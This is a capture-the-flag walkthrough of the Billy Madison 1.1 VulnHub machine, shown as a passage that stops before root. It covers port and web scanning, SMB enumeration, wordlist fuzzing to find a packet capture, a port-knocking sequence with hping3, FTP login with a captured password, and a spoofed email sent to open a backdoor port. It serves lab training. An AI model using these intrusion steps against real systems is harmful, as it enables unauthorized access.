## Billy Madison: 1.1

### info

```
IMPORTANT NOTE: do not use host-only mode, as issues have been discovered. Set the Billy Madison VM to "auto-detect" to get a regular DHCP address off your network.

Plot: Help Billy Madison stop Eric from taking over Madison Hotels!

Sneaky Eric Gordon has installed malware on Billy's computer right before the two of them are set to face off in an academic decathlon. Unless Billy can regain control of his machine and decrypt his 12th grade final project, he will not graduate from high school. Plus, it means Eric wins, and he takes over as head of Madison Hotels!

Objective: The primary objective of the VM is to figure out how Eric took over the machine and then undo his changes so you can recover Billy's 12th grade final project. You will probably need to root the box to complete this objective.

Download:

    BillyMadison1dot0.zip - https://dl.dropboxusercontent.com/u/5473387/BillyMadison1dot0.zip
    MD5 = afcb926608d6d7b2471e4de6c367afb4
    SHA1 = 4933ca408fcb2e88e6388fe4ea321f758b133d72

Other Information:

    Size: 1.68GB
    Hypervisor: Created with VMWare ESXi 6.0.0
    Difficulty: Beginner/Moderate

Special Thanks To:

    @rand0mbytez and @mrb3n813 for their tenacious help in beta testing, ironing out the bugs, suggesting better ways to do things, battling trolls and just generally being awesome.
    @g0tmi1k, @_RastaMouse and the VulnHub crew for hosting VMs, encouraging VM creators/testers and being a tremendous resource to the infosec community.
    @CRWhiteHat for helping and testing with Vbox
    My wife. She rules.


Changelog: 2016-09-09 - v1.0 (Initial release) 2016-09-14 - v1.1 (Fix for VirtualBox users - Thanks @CRWhiteHat)

https://www.vulnhub.com/entry/billy-madison-11,161/
```

### discovery

```
root@kali:~# netdiscover -r 192.168.93.0/24
 Currently scanning: Finished!   |   Screen View: Unique Hosts

 4 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 240
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname
 -----------------------------------------------------------------------------
 192.168.93.1    00:50:56:c0:00:08      1      60  VMware, Inc.
 192.168.93.2    00:50:56:fe:26:a7      1      60  VMware, Inc.
 192.168.93.151  00:0c:29:d2:44:98      1      60  VMware, Inc.
 192.168.93.254  00:50:56:fe:eb:a4      1      60  VMware, Inc.
```

### nmap scan

```bash
root@kali:~# nmap -p- -sV -sC 192.168.93.151

Starting Nmap 7.25BETA2 ( https://nmap.org ) at 2016-09-21 05:33 EDT
Stats: 0:01:32 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 83.20% done; ETC: 05:34 (0:00:19 remaining)
Nmap scan report for 192.168.93.151
Host is up (0.00040s latency).
Not shown: 65526 filtered ports
PORT     STATE  SERVICE     VERSION
22/tcp   open   ssh         OpenSSH 7.3p1 Debian 1 (protocol 2.0)
| ssh-hostkey:
|   2048 ad:82:14:b9:81:9e:cf:bd:fd:d2:a1:df:b6:75:86:ce (RSA)
|_  256 2d:b3:c4:fc:01:69:f0:45:f3:a2:ae:eb:3c:ad:ff:a7 (ECDSA)
23/tcp   open   telnet?
69/tcp   open   http        BaseHTTPServer
|_http-generator: WordPress 1.0
|_http-server-header: MadisonHotelsWordpress
|_http-title: Welcome | Just another WordPress site
80/tcp   open   http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Oh nooooooo!
137/tcp  closed netbios-ns
138/tcp  closed netbios-dgm
139/tcp  open   netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open   netbios-ssn Samba smbd 4.3.9-Ubuntu (workgroup: WORKGROUP)
2525/tcp open   smtp
| smtp-commands: BM, 8BITMIME, AUTH LOGIN, Ok,
|_ SubEthaSMTP null on BM Topics: HELP HELO RCPT MAIL DATA AUTH EHLO NOOP RSET VRFY QUIT STARTTLS For more info use "HELP <topic>". End of HELP info
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port23-TCP:V=7.25BETA2%I=7%D=9/21%Time=57E25436%P=x86_64-pc-linux-gnu%r
SF:(NULL,E6,"\n\n\*\*\*\*\*\x20HAHAH!\x20You're\x20banned\x20for\x20a\x20w
SF:hile,\x20Billy\x20Boy!\x20\x20By\x20the\x20way,\x20I\x20caught\x20you\x
SF:20trying\x20to\x20hack\x20my\x20wifi\x20-\x20but\x20the\x20joke's\x20on
SF:\x20you!\x20I\x20don't\x20use\x20ROTten\x20passwords\x20like\x20rkfpuzr
SF:ahngvat\x20anymore!\x20Madison\x20Hotels\x20is\x20as\x20good\x20as\x20M
SF:INE!!!!\x20\*\*\*\*\*\n\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port2525-TCP:V=7.25BETA2%I=7%D=9/21%Time=57E2543C%P=x86_64-pc-linux-gnu
SF:%r(NULL,1F,"220\x20BM\x20ESMTP\x20SubEthaSMTP\x20null\r\n")%r(GetReques
SF:t,5A,"220\x20BM\x20ESMTP\x20SubEthaSMTP\x20null\r\n500\x20Error:\x20com
SF:mand\x20not\x20implemented\r\n500\x20Error:\x20bad\x20syntax\r\n")%r(Ge
SF:nericLines,4D,"220\x20BM\x20ESMTP\x20SubEthaSMTP\x20null\r\n500\x20Erro
SF:r:\x20bad\x20syntax\r\n500\x20Error:\x20bad\x20syntax\r\n")%r(Help,13D,
SF:"220\x20BM\x20ESMTP\x20SubEthaSMTP\x20null\r\n214-SubEthaSMTP\x20null\x
SF:20on\x20BM\r\n214-Topics:\r\n214-\x20\x20\x20\x20\x20HELP\r\n214-\x20\x
SF:20\x20\x20\x20HELO\r\n214-\x20\x20\x20\x20\x20RCPT\r\n214-\x20\x20\x20\
SF:x20\x20MAIL\r\n214-\x20\x20\x20\x20\x20DATA\r\n214-\x20\x20\x20\x20\x20
SF:AUTH\r\n214-\x20\x20\x20\x20\x20EHLO\r\n214-\x20\x20\x20\x20\x20NOOP\r\
SF:n214-\x20\x20\x20\x20\x20RSET\r\n214-\x20\x20\x20\x20\x20VRFY\r\n214-\x
SF:20\x20\x20\x20\x20QUIT\r\n214-\x20\x20\x20\x20\x20STARTTLS\r\n214-For\x
SF:20more\x20info\x20use\x20\"HELP\x20<topic>\"\.\r\n214\x20End\x20of\x20H
SF:ELP\x20info\r\n");
MAC Address: 00:0C:29:D2:44:98 (VMware)
Service Info: Host: BM; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1s, deviation: 0s, median: 1s
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.3.9-Ubuntu)
|   Computer name: bm
|   NetBIOS computer name: BM
|   Domain name:
|   FQDN: bm
|_  System time: 2016-09-21T04:35:14-05:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smbv2-enabled: Server supports SMBv2 protocol

Post-scan script results:
| clock-skew:
|_  1s: Majority of systems scanned
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 170.39 seconds
```

### telnet

```bash
root@kali:~# telnet 192.168.93.151 23
Trying 192.168.93.151...
telnet: Unable to connect to remote host: Connection refused
```
```bash
root@kali:~# nc 192.168.93.151 23
(UNKNOWN) [192.168.93.151] 23 (telnet) : Connection refused
```
ok moving on

### http port 69

```bash
root@kali:~# curl -I http://192.168.93.151:69
HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 6589
Server: MadisonHotelsWordpress
Date: Wed, 21 Sep 2016 09:38:19 GMT
```

running wordpress so `wpscan` time

```bash
root@kali:~# wpscan --url http://192.168.93.151:69
_______________________________________________________________
        __          _______   _____
        \ \        / /  __ \ / ____|
         \ \  /\  / /| |__) | (___   ___  __ _ _ __
          \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
           \  /\  /  | |     ____) | (__| (_| | | | |
            \/  \/   |_|    |_____/ \___|\__,_|_| |_|

        WordPress Security Scanner by the WPScan Team
                       Version 2.9.1
          Sponsored by Sucuri - https://sucuri.net
   @_WPScan_, @ethicalhack3r, @erwan_lr, pvdl, @_FireFart_
_______________________________________________________________

The plugins directory 'wp-content/plugins' does not exist.
You can specify one per command line option (don't forget to include the wp-content directory if needed)
[?] Continue? [Y]es [N]o, default: [N]
Y
[+] URL: http://192.168.93.151:69/
[+] Started: Wed Sep 21 05:41:24 2016

[!] The WordPress 'http://192.168.93.151:69/readme.html' file exists exposing a version number
[+] Interesting header: SERVER: MadisonHotelsWordpress
[+] XML-RPC Interface available under: http://192.168.93.151:69/xmlrpc.php

[+] WordPress version 1.0 identified from meta generator (Released on 2004-01-03)

[+] WordPress theme in use: twentyeleven

[+] Name: twentyeleven
 |  Latest version: 2.5
 |  Location: http://192.168.93.151:69/wp-content/themes/twentyeleven/
 |  Readme: http://192.168.93.151:69/wp-content/themes/twentyeleven/readme.txt
 |  Changelog: http://192.168.93.151:69/wp-content/themes/twentyeleven/changelog.txt
 |  Style URL: http://192.168.93.151:69/wp-content/themes/twentyeleven/style.css
 |  Referenced style.css: http://192.168.93.151:69/static/wp-content/themes/twentyeleven/style.css

[+] Enumerating plugins from passive detection ...
[+] No plugins found

[+] Finished: Wed Sep 21 05:41:25 2016
[+] Requests Done: 59
[+] Memory used: 15.613 MB
[+] Elapsed time: 00:00:00

```

ok `nikto` time

```bash
root@kali:~# nikto -h http://192.168.93.151:69
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.93.151
+ Target Hostname:    192.168.93.151
+ Target Port:        69
+ Start Time:         2016-09-21 05:42:44 (GMT-4)
---------------------------------------------------------------------------
+ Server: MadisonHotelsWordpress
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Allowed HTTP Methods: HEAD, GET, POST, OPTIONS
+ OSVDB-3092: /xmlrpc.php: xmlrpc.php was found.
+ /readme.html: This WordPress file reveals the installed version.
+ /wp-login.php: Wordpress login found
+ /wp-content/plugins/gravityforms/change_log.txt: Gravity forms is installed. Based on the version number in the changelog, it is vulnerable to an authenticated SQL injection. https://wpvulndb.com/vulnerabilities/7849
+ 7550 requests: 13 error(s) and 8 item(s) reported on remote host
+ End Time:           2016-09-21 05:43:05 (GMT-4) (21 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

time for `dirb`

```bash
root@kali:~# dirb http://192.168.93.151:69/

-----------------
DIRB v2.22
By The Dark Raver
-----------------

START_TIME: Wed Sep 21 05:44:44 2016
URL_BASE: http://192.168.93.151:69/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612

---- Scanning URL: http://192.168.93.151:69/ ----
+ http://192.168.93.151:69/index.php (CODE:200|SIZE:6589)
+ http://192.168.93.151:69/wp-admin (CODE:302|SIZE:231)
+ http://192.168.93.151:69/xmlrpc.php (CODE:200|SIZE:42)

-----------------
END_TIME: Wed Sep 21 05:44:56 2016
DOWNLOADED: 4612 - FOUND: 3
```

lets move on

### http 80

```bash
root@kali:~# curl -I http://192.168.93.151/
HTTP/1.1 200 OK
Date: Wed, 21 Sep 2016 09:47:05 GMT
Server: Apache/2.4.18 (Ubuntu)
Content-Type: text/html; charset=UTF-8
```

`nikto` not showing a lot

```bash
root@kali:~# nikto -h http://192.168.93.151/
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.93.151
+ Target Hostname:    192.168.93.151
+ Target Port:        80
+ Start Time:         2016-09-21 05:47:40 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ Server leaks inodes via ETags, header found with file /manual/, fields: 0x272 0x537ae56951000
+ OSVDB-3092: /manual/: Web server manual found.
+ OSVDB-3268: /manual/images/: Directory indexing found.
+ OSVDB-3233: /icons/README: Apache default file found.
+ 7535 requests: 0 error(s) and 8 item(s) reported on remote host
+ End Time:           2016-09-21 05:47:54 (GMT-4) (14 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested


      *********************************************************************
      Portions of the server's headers (Apache/2.4.18) are not in
      the Nikto database or are newer than the known string. Would you like
      to submit this information (*no server specific data*) to CIRT.net
      for a Nikto update (or you may email to sullo@cirt.net) (y/n)? y

+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ ERROR 302: Update failed, please notify sullo@cirt.net of this code.

```

### Samba

```bash
root@kali:~# smbclient -L 192.168.93.151
WARNING: The "syslog" option is deprecated
Enter root's password:
Domain=[WORKGROUP] OS=[Windows 6.1] Server=[Samba 4.3.9-Ubuntu]

	Sharename       Type      Comment
	---------       ----      -------
	EricsSecretStuff Disk
	IPC$            IPC       IPC Service (BM)
Domain=[WORKGROUP] OS=[Windows 6.1] Server=[Samba 4.3.9-Ubuntu]

	Server               Comment
	---------            -------
	BM                   BM

	Workgroup            Master
	---------            -------
	WORKGROUP            BM
```

```bash
root@kali:~# smbclient //192.168.93.151/EricsSecretStuff
WARNING: The "syslog" option is deprecated
Enter root's password:
Domain=[WORKGROUP] OS=[Windows 6.1] Server=[Samba 4.3.9-Ubuntu]
smb: \> ls
  .                                   D        0  Wed Sep 21 05:31:55 2016
  ..                                  D        0  Sat Aug 20 14:56:45 2016
  ._.DS_Store                        AH     4096  Wed Aug 17 10:32:07 2016
  ebd.txt                             N       35  Wed Sep 21 05:31:55 2016
  .DS_Store                          AH     6148  Wed Aug 17 10:32:12 2016

		30291996 blocks of size 1024. 25797892 blocks available
smb: \> get ebd.txt
getting file \ebd.txt of size 35 as ebd.txt (6.8 KiloBytes/sec) (average 6.8 KiloBytes/sec)
smb: \> get .DS_Store
getting file \.DS_Store of size 6148 as .DS_Store (285.9 KiloBytes/sec) (average 232.2 KiloBytes/sec)
smb: \> exit
```

ok great was able to get some files from the `EricsSecretStuff` share.

```bash
root@kali:~# cat ebd.txt
Erics backdoor is currently CLOSED
```

```bash
root@kali:~# strings ./DS_Store
Bud1
bplist
.bwspblob
bplist00
]ShowStatusBar_
SidebarWidthTenElevenOrLater[ShowToolbar[ShowTabView_
ContainerShowSidebar\WindowBounds\SidebarWidth_
PreviewPaneVisibility[ShowSidebar[ShowPathbar
{{526, 248}, {770, 436}}
+JVby
.vSrnlong
rlg1Scomp
rmoDDdutc
rmodDdutc
rph1Scomp
DSDB
```

### smtp

```bash
root@kali:~# nc 192.168.93.151 2525
220 BM ESMTP SubEthaSMTP null
HELP
^C
```
--------------------

ok nothing, at this point i think its best to go back around.

--------------------

i decided to look into a bit more of the theme for this box, i've never heard of Billy Madison. I came across [http://www.great-quotes.com/quotes/movie/Billy+Madison](http://www.great-quotes.com/quotes/movie/Billy+Madison) that looks promising to make a wordlist from.

### making the wordlist

`cewl -d 1 -w cewl.txt http://www.great-quotes.com/quotes/movie/Billy+Madison`  

### using the wordlist

```bash
root@kali:~/BM# gobuster -w ./cewl.txt -u http://192.168.93.151/ -e

Gobuster v1.2                OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://192.168.93.151/
[+] Threads      : 10
[+] Wordlist     : ./cewl.txt
[+] Status codes : 307,200,204,301,302
[+] Expanded     : true
=====================================================
http://192.168.93.151/exschmenuating (Status: 301)
=====================================================
```

the new page looks to ban your IP

```html
root@kali:~/BM# curl http://192.168.93.151/exschmenuating
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>301 Moved Permanently</title>
</head><body>
<h1>Moved Permanently</h1>
<p>The document has moved <a href="http://192.168.93.151/exschmenuating/">here</a>.</p>
<hr>
<address>Apache/2.4.18 (Ubuntu) Server at 192.168.93.151 Port 80</address>
</body></html>
root@kali:~/BM# curl http://192.168.93.151/exschmenuating/

<TITLE>Eric's Admin Console 1.0</TITLE>
<html>
<h1>"Ruin Billy Madison's Life" - Eric's notes</h1>
<p>
<center><h1>08/01/16</h1></center>
Looks like Principal Max is too much of a goodie two-shoes to help me ruin Billy Boy's life.  Will ponder other victims.

<center><h1>08/02/16</h1></center>
Ah!  Genius thought!  Billy's girlfriend Veronica uses his machine too.  I might have to cook up a phish and see if I can't get her to take the bait.

<center><h2>08/03/16</h2></center>
OMg LOL LOL LOL!!!  What a twit - I can't believe she fell for it!!  I .captured the whole thing in this folder for later lulz.  I put "veronica" somewhere in the file name because I bet you a million dollars she uses her name as part of her passwords - if that's true, she rocks!

Anyway, malware installation successful.  I'm now in complete control of Bill's machine!

<center>
<center><h1>Log monitor</h1></center>
<p>
<center>This will help me keep an eye on Billy's attempt to free his machine from my wrath.</center>
<p>
<center><a href="currently-banned-hosts.txt">View log</a>
<p>
</html>
```

```
root@kali:~/BM# curl http://192.168.93.151/exschmenuating/currently-banned-hosts.txt
---
2016-09-21-07-26-01
Hosts currently banned
Chain INPUT (policy DROP)
DROP       all  --  192.168.93.149       anywhere
---
If your IP appears in this list it has been banned, and you will need to reset this host to lift the ban. Otherwise, further efforts to connect to this host may produce false positives or refuse connections altogether.
---
```

lets reboot the vm

the ip still shows after a reboot so i continue to move on, the last post from the new page is interesting.

### .capture

the last post from `http://192.168.93.151/exschmenuating`

>OMg LOL LOL LOL!!!  What a twit - I can't believe she fell for it!!  I .captured the whole thing in this folder for later lulz.  I put "veronica" somewhere in the file name because I bet you a million dollars she uses her name as part of her passwords - if that's true, she rocks!

got me thinking, i decided to take all the `veronica` matching entries in the rockyou wordlist and then fuzz the web page for `.capture` `.pcap` and `.cap`


`root@kali:~/BM# cat /usr/share/wordlists/rockyou.txt | grep veronica >> veronica.txt`

and then fuzzing

```bash
root@kali:~/BM# wfuzz -c -w /root/BM/veronica.txt --sc 200 "http://192.168.93.151/exschmenuating/FUZZ.cap"
********************************************************
* Wfuzz 2.1.3 - The Web Bruteforcer                      *
********************************************************

Target: http://192.168.93.151/exschmenuating/FUZZ.cap
Total requests: 773

==================================================================
ID	Response   Lines      Word         Chars          Request
==================================================================

00716:  C=200    192 L	     722 W	   8700 Ch	  "012987veronica"
00721:  C=200     24 L	     162 W	   1080 Ch	  "#0104veronica"

Total time: 1.112895
Processed Requests: 773
Filtered Requests: 771
Requests/sec.: 694.5842

```

```bash
root@kali:~/BM# wget http://192.168.93.151/exschmenuating/012987veronica.cap
--2016-09-21 09:17:40--  http://192.168.93.151/exschmenuating/012987veronica.cap
Connecting to 192.168.93.151:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 8700 (8.5K) [application/vnd.tcpdump.pcap]
Saving to: ‘012987veronica.cap’

012987veronica.cap                      100%[=============================================================================>]   8.50K  --.-KB/s    in 0s

2016-09-21 09:17:40 (146 MB/s) - ‘012987veronica.cap’ saved [8700/8700]

```

viewing with `tcpdump` with `-A` shows some emails

>To: vvaughn@polyfector.edu
From: eric@madisonhotels.com
Subject: VIRUS ALERT!
X-Mailer: swaks v20130209.0 jetmore.org/john/code/swaks/

>Hey Veronica,
>
>Eric Gordon here.
>
>I know you use Billy's machine more than he does, so I wanted to let you know that the company is rolling out a new antivirus program for all work-from-home users.  Just <a href="http://areallyreallybad.malware.edu.org.ru/f3fs0azjf.php">click here</a> to install it, k?
>
>Thanks. -Eric


>To: eric@madisonhotels.com
From: vvaughn@polyfector.edu
Subject: test Sat, 20 Aug 2016 21:57:00 -0500
X-Mailer: swaks v20130209.0 jetmore.org/john/code/swaks/
RE: VIRUS ALERT!
>
>Eric,
>
>Thanks for your message. I tried to download that file but my antivirus blocked it.
>
>Could you just upload it directly to us via FTP?  We keep FTP turned off unless someone connects with the "Spanish Armada" combo.
>
>https://www.youtube.com/watch?v=z5YU7JwVy7s
>
>-VV


>To: vvaughn@polyfector.edu
From: eric@madisonhotels.com
Subject: test Sat, 20 Aug 2016 21:57:11 -0500
X-Mailer: swaks v20130209.0 jetmore.org/john/code/swaks/
RE[2]: VIRUS ALERT!
>
>Veronica,
>
>Thanks that will be perfect.  Please set me up an account with username of "eric" and password "ericdoesntdrinkhisownpee."
>
>-Eric


>To: eric@madisonhotels.com
From: vvaughn@polyfector.edu
Subject: test Sat, 20 Aug 2016 21:57:21 -0500
X-Mailer: swaks v20130209.0 jetmore.org/john/code/swaks/
RE[3]: VIRUS ALERT!
>
>Eric,
>
>Done.
>
>-V


>To: vvaughn@polyfector.edu
From: eric@madisonhotels.com
Subject: test Sat, 20 Aug 2016 21:57:31 -0500
X-Mailer: swaks v20130209.0 jetmore.org/john/code/swaks/
RE[4]: VIRUS ALERT!
>
>Veronica,
>
>Great, the file is uploaded to the FTP server, please go to a terminal and run the file with your account - the install will be automatic and you won't get any pop-ups or anything like that.  Thanks!
>
>-Eric


>To: eric@madisonhotels.com
From: vvaughn@polyfector.edu
Subject: test Sat, 20 Aug 2016 21:57:41 -0500
X-Mailer: swaks v20130209.0 jetmore.org/john/code/swaks/
RE[5]: VIRUS ALERT!
>
>Eric,
>
>I clicked the link and now this computer is acting really weird.  The antivirus program is popping up alerts, my mouse started to move on its own, my background changed color and other weird stuff.  I'm going to send this email to you and then shut the computer down.  I have some important files I'm worried about, and Billy's working on his big 12th grade final.  I don't want anything to happen to that!
>
>-V

so i think the Spanish Armada from [https://www.youtube.com/watch?v=z5YU7JwVy7s](https://www.youtube.com/watch?v=z5YU7JwVy7s) is   

```
1466
67
1469
1514
1981
1986
```

sounds like port knocking

`for num in 1466 67 1469 1514 1981 1986; do hping3 -S -c 1 -p $num 192.168.93.151 ; done`

and ftp is now open

```bash
root@kali:~/BM# nmap 192.168.93.151

Starting Nmap 7.25BETA2 ( https://nmap.org ) at 2016-09-22 05:41 EDT
Nmap scan report for 192.168.93.151
Host is up (0.00061s latency).
Not shown: 993 filtered ports
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
23/tcp   open  telnet
80/tcp   open  http
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
2525/tcp open  ms-v-worlds
MAC Address: 00:0C:29:D2:44:98 (VMware)
```

### ftp

```bash
root@kali:~/BM# ftp 192.168.93.151
Connected to 192.168.93.151.
220 Welcome to ColoradoFTP - the open source FTP server (www.coldcore.com)
Name (192.168.93.151:root): eric
331 User name okay, need password.
Password:
230 User logged in, proceed.
Remote system type is UNIX.
ftp>
```

```bash
ftp> ls
200 PORT command successful.
150 Opening A mode data connection for /.
-rwxrwxrwx 1 ftp 6326 Aug 20 12:49 40049
-rwxrwxrwx 1 ftp 5208 Aug 20 12:49 39773
-rwxrwxrwx 1 ftp 5367 Aug 20 12:49 39772
-rwxrwxrwx 1 ftp 1287 Aug 20 12:49 9129
-rwxrwxrwx 1 ftp 868 Sep 01 10:42 .notes
-rwxrwxrwx 1 ftp 9132 Aug 20 12:49 40054
226 Transfer completed.
```

lets download them all

```bash
ftp> mget *
mget 40049? y
200 PORT command successful.
150 Opening A mode data connection for 40049.
226 Transfer completed for "40049".
6326 bytes received in 0.50 secs (12.4675 kB/s)
mget 39773? y
200 PORT command successful.
150 Opening A mode data connection for 39773.
226 Transfer completed for "39773".
5208 bytes received in 0.69 secs (7.4124 kB/s)
mget 40054? y
200 PORT command successful.
150 Opening A mode data connection for 40054.
226 Transfer completed for "40054".
9132 bytes received in 0.92 secs (9.6490 kB/s)
mget 9129? y
200 PORT command successful.
150 Opening A mode data connection for 9129.
226 Transfer completed for "9129".
1287 bytes received in 0.76 secs (1.6446 kB/s)
mget 39772? y
200 PORT command successful.
150 Opening A mode data connection for 39772.
226 Transfer completed for "39772".
5367 bytes received in 0.89 secs (5.9043 kB/s)
mget .notes? y
200 PORT command successful.
150 Opening A mode data connection for .notes.
226 Transfer completed for ".notes".
889 bytes received in 0.88 secs (0.9910 kB/s)
```

```bash
ftp> get 40054
local: 40054 remote: 40054
200 PORT command successful.
150 Opening A mode data connection for 40054.
226 Transfer completed for "40054".
9132 bytes received in 0.27 secs (32.7528 kB/s)
```

can i upload ?

yes i can

```bash
ftp> put test.txt
local: test.txt remote: test.txt
200 PORT command successful.
150 Opening A mode data connection for test.txt.
226 Transfer completed for "test.txt".
ftp> ls
200 PORT command successful.
150 Opening A mode data connection for /.
-rwxrwxrwx 1 ftp 0 Sep 22 04:46 test.txt
-rwxrwxrwx 1 ftp 6326 Aug 20 12:49 40049
-rwxrwxrwx 1 ftp 9132 Aug 20 12:49 40054
-rwxrwxrwx 1 ftp 1287 Aug 20 12:49 9129
-rwxrwxrwx 1 ftp 868 Sep 01 10:42 .notes
-rwxrwxrwx 1 ftp 5367 Aug 20 12:49 39772
-rwxrwxrwx 1 ftp 5208 Aug 20 12:49 39773
226 Transfer completed.
```

maybe use this later

so `39772  39773  40049  40054  9129` all look to be kernel exploits

```bash
root@kali:~/BM# for x in 39772  39773  40049  40054  9129; do searchsploit $x ;done
-------------------------------------------------------------------------------------------------- ----------------------------------
 Exploit Title                                                                                    |  Path
                                                                                                  | (/usr/share/exploitdb/platforms)
-------------------------------------------------------------------------------------------------- ----------------------------------
Linux Kernel 4.4.x (Ubuntu 16.04) - 'double-fdput()' in bpf(BPF_PROG_LOAD) Privilege Escalation   | ./linux/local/39772.txt
-------------------------------------------------------------------------------------------------- ----------------------------------
-------------------------------------------------------------------------------------------------- ----------------------------------
 Exploit Title                                                                                    |  Path
                                                                                                  | (/usr/share/exploitdb/platforms)
-------------------------------------------------------------------------------------------------- ----------------------------------
Linux Kernel (Ubuntu 16.04) - Reference Count Overflow Using BPF Maps                             | ./linux/dos/39773.txt
-------------------------------------------------------------------------------------------------- ----------------------------------
-------------------------------------------------------------------------------------------------- ----------------------------------
 Exploit Title                                                                                    |  Path
                                                                                                  | (/usr/share/exploitdb/platforms)
-------------------------------------------------------------------------------------------------- ----------------------------------
Linux Kernel 4.4.0-21 (Ubuntu 16.04 x64) - Netfilter target_offset OOB Privilege Escalation       | ./linux/local/40049.c
-------------------------------------------------------------------------------------------------- ----------------------------------
-------------------------------------------------------------------------------------------------- ----------------------------------
 Exploit Title                                                                                    |  Path
                                                                                                  | (/usr/share/exploitdb/platforms)
-------------------------------------------------------------------------------------------------- ----------------------------------
Exim 4 (Debian 8 / Ubuntu 16.04) - Spool Privilege Escalation                                     | ./linux/local/40054.c
-------------------------------------------------------------------------------------------------- ----------------------------------
-------------------------------------------------------------------------------------------------- ----------------------------------
 Exploit Title                                                                                    |  Path
                                                                                                  | (/usr/share/exploitdb/platforms)
-------------------------------------------------------------------------------------------------- ----------------------------------
censura 1.16.04 - (Blind SQL Injection / Cross-Site Scripting) Multiple Vulnerabilities           | ./php/webapps/9129.txt
```

```bash
root@kali:~# cat .notes
Ugh, this is frustrating.  

I managed to make a system account for myself. I also managed to hide Billy's paper
where he'll never find it.  However, now I can't find it either :-(.
To make matters worse, my privesc exploits aren't working.  
One sort of worked, but I think I have it installed all backwards.

If I'm going to maintain total control of Billy's miserable life (or what's left of it)
I need to root the box and find that paper!

Fortunately, my SSH backdoor into the system IS working.  
All I need to do is send an email that includes
the text: "My kid will be a ________ _________"

Hint: https://www.youtube.com/watch?v=6u7RsW5SAgs

The new secret port will be open and then I can login from there with my wifi password, which I'm
sure Billy or Veronica know.  I didn't see it in Billy's FTP folders, but didn't have time to
check Veronica's.

-EG
```

### email

from the hint in that note i'm assuming i need to send an email with the text `My kid will be a soccer player`. lets try

```bash
root@kali:~/BM# swaks --to eric@madisonhotels.com --from vvaughn@polyfector.edu --server 192.168.93.151:2525 --body "My kid will be a soccer player" --header "Subject: My kid will be a soccer player"
=== Trying 192.168.93.151:2525...
=== Connected to 192.168.93.151.
<-  220 BM ESMTP SubEthaSMTP null
 -> EHLO kali
<-  250-BM
<-  250-8BITMIME
<-  250-AUTH LOGIN
<-  250 Ok
 -> MAIL FROM:<vvaughn@polyfector.edu>
<-  250 Ok
 -> RCPT TO:<eric@madisonhotels.com>
<-  250 Ok
 -> DATA
<-  354 End data with <CR><LF>.<CR><LF>
 -> Date: Thu, 22 Sep 2016 08:28:00 -0400
 -> To: eric@madisonhotels.com
 -> From: vvaughn@polyfector.edu
 -> Subject: My kid will be a soccer player
 -> X-Mailer: swaks v20130209.0 jetmore.org/john/code/swaks/
 ->
 -> My kid will be a soccer player
 ->
 -> .
<-  250 Ok
 -> QUIT
<-  221 Bye
=== Connection closed with remote host.
```

and nmap to see if ssh is open

```bash
root@kali:~/BM# nmap -p- 192.168.93.151

Starting Nmap 7.25BETA2 ( https://nmap.org ) at 2016-09-22 08:38 EDT
Nmap scan report for 192.168.93.151
Host is up (0.00038s latency).
Not shown: 65525 filtered ports
PORT     STATE  SERVICE
22/tcp   open   ssh
23/tcp   open   telnet
69/tcp   open   tftp
80/tcp   open   http
137/tcp  closed netbios-ns
138/tcp  closed netbios-dgm
139/tcp  open   netbios-ssn
445/tcp  open   microsoft-ds
1974/tcp open   drp
2525/tcp open   ms-v-worlds
MAC Address: 00:0C:29:D2:44:98 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 104.90 seconds

```
port `1974` is a new one

### Veronica's ftp folder

i re read the note from the ftp server and i missed the second part

>The new secret port will be open and then I can login from there with my wifi password, which I'm
sure Billy or Veronica know.  I didn't see it in Billy's FTP folders, but didn't have time to
check Veronica's.

so i need to login to ftp as Veronica but i dont know the password.

